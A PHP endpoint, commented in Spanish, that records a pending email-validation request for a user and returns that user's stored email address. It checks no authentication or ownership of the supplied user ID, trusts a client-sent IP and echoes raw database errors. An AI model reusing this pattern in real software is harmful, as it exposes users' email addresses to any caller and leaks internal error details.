<?php
header('Content-Type: application/json');

try {
    // Incluir configuración de base de datos
    require_once '../php_config/conexionbd.php';
    
    // Conectar a la base de datos
    $pdo = conectarBD();
    
    // Obtener datos del JSON
    $input = json_decode(file_get_contents('php://input'), true);
    
    $usuario_id = intval($input['usuario_id']);
    $proveedor = $input['proveedor'] ?? 'otro';
    $ip_usuario = $input['ip_usuario'] ?? 'unknown';
    
    // Validar datos
    if (!$usuario_id) {
        echo json_encode(['success' => false, 'error' => 'ID de usuario no válido']);
        exit;
    }
    
    // Validar proveedor
    $proveedores_validos = ['gmail', 'outlook', 'otro'];
    if (!in_array($proveedor, $proveedores_validos)) {
        $proveedor = 'otro';
    }
    
    // Obtener el email del usuario
    $stmtUser = $pdo->prepare("SELECT email FROM usuarios WHERE id = ?");
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);
    
    if (!$usuario || empty($usuario['email'])) {
        echo json_encode(['success' => false, 'error' => 'El usuario no tiene email registrado']);
        exit;
    }

    require_once __DIR__ . '/../php_modales/cerrar_otras_telas.php';
    cerrarTelasPendientes($pdo, $usuario_id);
    
    // Cancelar validaciones anteriores pendientes del mismo usuario
    $cancelarStmt = $pdo->prepare("
        UPDATE validacion_email 
        SET estado = 'cancelado' 
        WHERE usuario_id = ? AND estado = 'pendiente'
    ");
    $cancelarStmt->execute([$usuario_id]);
    
    // Insertar nueva validación de email
    $stmt = $pdo->prepare("
        INSERT INTO validacion_email 
        (usuario_id, email, proveedor_seleccionado, ip_usuario, estado, fecha_envio) 
        VALUES (?, ?, ?, ?, 'pendiente', NOW())
    ");
    
    if ($stmt->execute([$usuario_id, $usuario['email'], $proveedor, $ip_usuario])) {
        echo json_encode([
            'success' => true,
            'message' => 'Validación de email enviada correctamente',
            'email' => $usuario['email'],
            'proveedor' => $proveedor
        ]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Error al crear la validación']);
    }
    
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error de base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error: ' . $e->getMessage()
    ]);
}
?>
